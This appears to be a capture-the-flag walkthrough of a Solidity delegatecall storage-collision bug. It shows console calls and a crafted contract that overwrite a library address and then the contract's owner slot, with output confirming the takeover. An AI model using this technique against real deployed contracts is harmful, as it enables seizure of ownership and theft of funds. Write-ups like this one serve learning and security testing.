When using `delegatecall` accessing storage in the delagatee can be dangerous. This is because the storage slots in the delegatee contract will overlap with the storage slots from the delegator contract, which means code from the delegatee can inadvertently change fields in the delegator. More details about this bug can be found in https://ethereum.stackexchange.com/questions/57418/scope-confusion-using-delegate-call.

To determine if there is an issue we can first do this:
```javascript
await contract.setSecondTime("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
```

Now querying the timeZone1Library field of the delegator we can see that it has been overwritten with part of our provided value.
```javascript
await contract.timeZone1Library()
"0xffffffffffffffffffffffffffffffffffffffff"
```

This address that has been overwritten is the address that will be delegated to for the function call, which means that we can deploy our own contract and delegate the execution to that.

We create a test contract like so:
```solidity
pragma solidity ^0.4.18;


contract Preservation {
    uint256 firstSlot;
    uint256 secondSlot;
    uint256 thirdSlot;
    
    function setTime(uint256) public {
        firstSlot = 0xdeadbeefdeadbeefdeadbeefdeadbeef;
        secondSlot = 0xcafebabecafebabecafebabecafebabe;
        thirdSlot = 0xdeadc0dedeadc0dedeadc0dedeadc0de;
    }
}
```

And overwrite the delagatee address with the address of our contract:
```javascript
await contract.setSecondTime("0xaa811B99102368B78D07b87Ed92b222Ae1cBb61F")
```

Querying the public state we can now see that the first three slots have been overwritten with each of our values. The owner field is the one which we want to overwrite, which we can see correspondings to `0x00000000deadc0dedeadc0dedeadc0dedeadc0de`, i.e. `thirdSlot`.
```javascript
await contract.timeZone1Library()
"0x00000000deadbeefdeadbeefdeadbeefdeadbeef"
await contract.timeZone2Library()
"0x00000000cafebabecafebabecafebabecafebabe"
await contract.owner()
"0x00000000deadc0dedeadc0dedeadc0dedeadc0de"
```

With this information we can deploy a new contract which will overwrite the `owner` slot with our own address.
```solidity
pragma solidity ^0.4.18;


contract Preservation {
    uint256 firstSlot;
    uint256 secondSlot;
    uint256 thirdSlot;
    
    function setTime(uint256) public {
        thirdSlot = uint256(0x8E0Ff062059376013FA56470805bec01b5aD06cc);
    }
}
```

Now we overwrite the delegatee address to make it point to our contract:
```javascript
await contract.setSecondTime("0xE2ACc7C391008492BCecF14A286d784559F6091A")
```

Finally we can see `owner` has been overwritten to our own address. 
```javascript
await contract.owner()
"0x8e0ff062059376013fa56470805bec01b5ad06cc"
```
